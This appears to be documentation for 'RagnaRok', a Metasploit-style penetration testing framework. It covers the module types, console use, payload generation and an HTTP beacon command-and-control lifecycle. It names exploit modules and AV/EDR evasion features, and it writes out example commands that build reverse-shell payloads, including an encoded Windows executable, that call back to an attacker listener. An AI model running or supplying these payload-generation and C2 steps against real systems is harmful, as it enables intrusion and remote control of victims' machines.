# RagnaRok (PySploit) Framework Documentation

**Version:** 2.0
**Codename:** RagnaRok

RagnaRok is an advanced, modular penetration testing framework modeled after Metasploit. It features a complete architecture for discovering vulnerabilities, generating payloads, evading defenses, and managing persistent C2 sessions.

---

## 1. Architecture Overview

The framework is divided into modular, highly uncoupled components:

### Core Components
*   **`PySploitFramework` (`core/framework.py`)**: The central engine. Automatically discovers and loads all modules dynamically upon startup.
*   **`SessionManager` (`core/session_manager.py`)**: Handles the lifecycle of all active connections. Backed by a thread-safe WAL-mode SQLite database (`sessions.db`) to ensure session state persists across framework restarts.
*   **`HTTPHandler` & `ReverseShellHandler` (`core/handlers.py`)**: Listener infrastructure. Operates in background threads to catch reverse connections and manage HTTP C2 beacons concurrently.
*   **`EvasionEngine` (`core/evasion_engine.py`)**: An optional processing layer designed to obfuscate payloads and inject direct syscalls before deployment to bypass AV/EDR.

### Module Registries
*   **Exploits**: Weaponized vulnerabilities (e.g., `confluence_cve_2023_22527`, `log4shell`, `eternalblue`).
*   **Auxiliary**: Scanners, DOS tools, and intelligence gathering (e.g., `portscan`, `apiscan`, `ddos_test`).
*   **Payloads**: Code execution stubs (`windows/reverse_tcp`, `android/reverse_tcp`, `beacon/reverse_https`).
*   **Encoders**: Payload obfuscators (`aes`, `xor`, `base64`).
*   **Formatters**: Payload wrappers (`exe`, `ps1`, `raw`).

---

## 2. Modes of Operation

RagnaRok supports two primary modes of operation, automatically parsed by the central launcher `pysploit.py`.

### A. Console Mode (MSFConsole Style)
The interactive interface for interacting with modules and sessions.
```bash
python3 pysploit.py
```
**Key Commands:**
*   `use <module>`: Select a module (e.g., `use exploit/confluence_cve_2023_22527`).
*   `set <OPTION> <VALUE>`: Configure module parameters.
*   `run` or `exploit`: Execute the current module.
*   `sessions list`: View all active and inactive sessions.
*   `sessions interact <id>`: Drop into an interactive shell for the specified session.

### B. Venom Mode (MSFVenom Style)
A non-interactive, quiet CLI for rapidly generating and encoding payloads. Output can be cleanly piped to other tools.
```bash
python3 pysploit.py venom -p <payload> --lhost <IP> --lport <PORT> [-e <encoder>] [-f <format>] [-o <output_file>]
```
**Examples:**
```bash
# Generate a raw Android reverse TCP shell
python3 pysploit.py venom -p android/reverse_tcp --lhost 192.168.1.5 --lport 4444

# Generate a base64 encoded Python reverse shell
python3 pysploit.py venom -p linux/reverse_python --lhost 10.0.0.5 --lport 8080 -e base64 -f python

# Generate a Windows payload and save to file
python3 pysploit.py venom -p windows/reverse_tcp --lhost 192.168.1.100 --lport 4444 -e xor -f exe -o payload.exe
```

---

## 3. The Beacon C2 Architecture

RagnaRok features a full HTTP Beacon infrastructure mimicking advanced threat actors.

1.  **Start the Listener:**
    In the console, start the HTTP handler:
    ```
    pysploit > handler http LHOST=0.0.0.0 LPORT=8080
    ```
2.  **Generate the Beacon:**
    ```
    python3 pysploit.py venom -p beacon/reverse_https --lhost <C2_IP> --lport 8080
    ```
3.  **Execution Lifecycle:**
    *   **Registration:** The beacon executes on the target and sends `POST /register` with `sysinfo` (Hostname, User, PID).
    *   **Session Tracking:** The `SessionManager` assigns a unique Session ID and tracks it in the database.
    *   **Polling:** The beacon sleeps with jitter, periodically polling `GET /tasks/<session_id>`.
    *   **Execution & Results:** The beacon executes queued tasks locally and returns the output via `POST /results/<session_id>`.

---

## 4. Development & Testing

RagnaRok has a 100% passing integration and unit test suite.
To verify framework integrity after making modifications:

```bash
# Run all core and component tests
python3 -m pytest tests/ -v
```

This ensures that session lifecycle, database thread-safety, module option parsing, and the handler infrastructures remain stable.
